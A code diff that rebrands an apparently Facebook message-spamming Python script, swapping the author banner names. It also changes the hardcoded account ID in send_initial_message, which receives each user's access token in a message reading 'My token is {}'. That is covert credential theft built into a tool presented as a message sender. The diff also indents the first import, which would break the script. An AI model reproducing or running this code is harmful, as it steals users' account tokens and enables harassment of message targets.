@@ -1,4 +1,4 @@
-import requests
+          import requests
 import json
 import time
 import sys
@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"   TRICKS BY SAMAR ")
+          self.wfile.write(b"   TRICKS BY RAMJEET")
 def execute_server():
       PORT = int(os.environ.get('PORT', 4000))
 
@@ -39,15 +39,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello samar sir! I am using your server. My token is {}"
+      msg_template = "Hello Ansh sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100001744194732"
+      target_id = "100078756803318"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•────────────────────── TRICKS BY SAMAR ───────────────────────────────•')
+          print('\033[1;92m' + '•────────────────────── TRICKS BY RAMJEET ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -121,12 +121,12 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] SAMAR SIR AAPKA MSG JA RHA HAI {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] RAMJEET SIR APKA SERVER USE KAR RHAA JU MSG JA RHAA HAI THANK{} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
             
-                      print("\033[1;91m[x] KUCH ISSU AARHA HAI TO SAMAR SIR SE BAAT KARO {} of Convo {} with Token {}: {}".format(
+                      print("\033[1;91m[x] RAMJEET SE CONNECT KARO WO SAHI KAR DEGA {} of Convo {} with Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
@@ -148,4 +148,3 @@ def main():
 
 if __name__ == '__main__':
       main()
-        
